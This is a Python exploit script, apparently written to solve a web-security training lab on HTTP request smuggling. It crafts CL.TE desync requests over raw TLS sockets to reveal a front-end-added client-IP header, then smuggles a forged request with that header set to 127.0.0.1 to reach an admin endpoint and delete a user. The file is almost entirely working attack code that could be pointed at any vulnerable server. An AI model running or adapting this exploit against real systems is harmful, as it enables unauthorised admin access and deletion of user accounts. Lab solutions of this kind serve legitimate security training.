# Exploiting HTTP request smuggling to reveal front-end request rewriting

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_x_header(host, port):
	request_body = '0\r\n\r\n'
	request_body += 'POST / HTTP/1.1\r\n'
	request_body += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_body += 'Content-Length: 200\r\n'
	request_body += 'Connection: close\r\n'
	request_body += '\r\n'
	request_body += 'search=test'

	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + host + '\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: 124\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock1 = context.wrap_socket(sock1, server_hostname=host)
	sock1.connect((host, port))
	sock1.sendall(request_content.encode())
	time.sleep(1)
	print(sock1.getpeername())
	resp = sock1.recv(4096)
	if re.search('X-(.*)-Ip', resp.decode()):
		x_blob = re.search('X-(.*)-Ip', resp.decode()).group(1)
		x_header = 'X-' + x_blob + '-Ip'
		sock1.close()
		print('[+] Found Header:\t%s' % x_header)
		return x_header
	sock1.close()
	sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock2 = context.wrap_socket(sock2, server_hostname=host)
	sock2.connect((host, port))
	sock2.sendall(request_content.encode())
	time.sleep(1)
	print(sock2.getpeername())
	resp = sock2.recv(4096)
	if re.search('X-(.*)-Ip', resp.decode()):
		x_blob = re.search('X-(.*)-Ip', resp.decode()).group(1)
		x_header = 'X-' + x_blob + '-Ip'
		sock2.close()
		print('[+] Found Header:\t%s' % x_header)
		return x_header
	else:
		print("[-] The exploit failed to reveal the header <!>")
		sys.exit(1)

def build_request(url, header):
	request_body = '0\r\n\r\n'
	request_body += 'GET /admin/delete?username=carlos HTTP/1.1\r\n'
	request_body += '%s: 127.0.0.1\r\n' % header
	request_body += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_body += 'Content-Length: 10\r\n'
	request_body += 'Connection: close\r\n'
	request_body += '\r\n'
	request_body += 'x=1'

	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	print(sock.getpeername())
	sock.close()

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send HTTP Request Smuggling attack...\n')
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url.scheme == "http":
			port = 80
		print(parsed_url)
		print('\n[+] Sending the request to reveal hidden header...')
		x_header = get_x_header(subdomain, port)
		request_content = build_request(subdomain, x_header)
		print('\n[+] Sending the request once !')
		raddr1 = send_smuggling(request_content, subdomain, port)
		r1 = s.get(url)
		print(r1)
		print('\n[+] Sending the request twice !')
		raddr2 = send_smuggling(request_content, subdomain, port)
		r = s.get(url)
		print(r)
		if r.status_code == 401 and r1.status_code == 401:
			print('[+] The lab should be solved !')

if __name__ == "__main__":
	main()
